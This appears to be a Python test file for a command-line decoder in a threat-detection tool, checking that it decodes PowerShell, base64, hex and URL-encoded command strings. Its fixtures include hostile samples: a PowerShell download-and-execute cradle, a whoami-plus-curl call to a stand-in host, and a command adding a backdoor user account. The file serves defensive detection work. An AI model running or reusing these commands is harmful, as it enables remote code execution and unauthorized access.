from app.agent.command_decode import decode_command_segments
from app.schemas import ProcessExecutionFields

_PS_PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')"
_PS_B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"


def test_decodes_powershell_encoded_command():
    process = ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {_PS_B64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert len(segments) == 1
    assert segments[0].encoding == "powershell_encoded"
    assert segments[0].decoded == _PS_PAYLOAD


def test_decodes_generic_base64_blob():
    b64 = "Y21kLmV4ZSAvYyB3aG9hbWkgJiYgY3VybCBodHRwOi8vZXZpbC50ZXN0L3g="
    process = ProcessExecutionFields(command_line=f"rundll32.exe shell32.dll,ShellExec_RunDLL {b64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert segments[0].encoding == "base64"
    assert segments[0].decoded == "cmd.exe /c whoami && curl http://evil.test/x"


def test_decodes_hex_blob():
    hex_blob = "6e65742075736572206861636b657220506173737730726421202f616464"
    process = ProcessExecutionFields(command_line=f"certutil.exe -decodehex {hex_blob}")

    segments, attempted, discarded = decode_command_segments(process)

    # the same span also matches the base64-alphabet scanner (hex digits are a subset
    # of base64's alphabet); that attempt decodes to non-printable garbage and is
    # discarded before the hex scanner gets a chance at the same (unconsumed) span.
    assert attempted == 2
    assert discarded == 1
    assert len(segments) == 1
    assert segments[0].encoding == "hex"
    assert segments[0].decoded == "net user hacker Passw0rd! /add"


def test_decodes_url_encoded_segment():
    process = ProcessExecutionFields(command_line="cmd.exe /c echo %68%65%6c%6c%6f")

    segments, attempted, discarded = decode_command_segments(process)

    assert attempted == 1
    assert discarded == 0
    assert segments[0].encoding == "url"
    assert segments[0].decoded == "cmd.exe /c echo hello"


def test_plain_command_line_produces_no_segments():
    process = ProcessExecutionFields(command_line="notepad.exe C:\\Users\\alice\\Documents\\report.txt")

    segments, attempted, discarded = decode_command_segments(process)

    assert segments == []
    assert attempted == 0
    assert discarded == 0


def test_discards_base64_shaped_token_that_decodes_to_non_printable_garbage():
    process = ProcessExecutionFields(command_line="foo.exe aGVsbG8gd29scmxkYWJjZGVmZ2hpamsQ1w2Zg==")

    segments, attempted, discarded = decode_command_segments(process)

    assert segments == []
    assert attempted == 1
    assert discarded == 1


def test_scans_parent_command_line_too():
    b64 = "Y21kLmV4ZSAvYyB3aG9hbWkgJiYgY3VybCBodHRwOi8vZXZpbC50ZXN0L3g="
    process = ProcessExecutionFields(command_line="notepad.exe", parent_command_line=f"cmd.exe /c {b64}")

    segments, attempted, discarded = decode_command_segments(process)

    assert len(segments) == 1
    assert segments[0].decoded == "cmd.exe /c whoami && curl http://evil.test/x"


def test_returns_empty_when_no_command_lines_set():
    segments, attempted, discarded = decode_command_segments(ProcessExecutionFields())

    assert segments == []
    assert attempted == 0
    assert discarded == 0
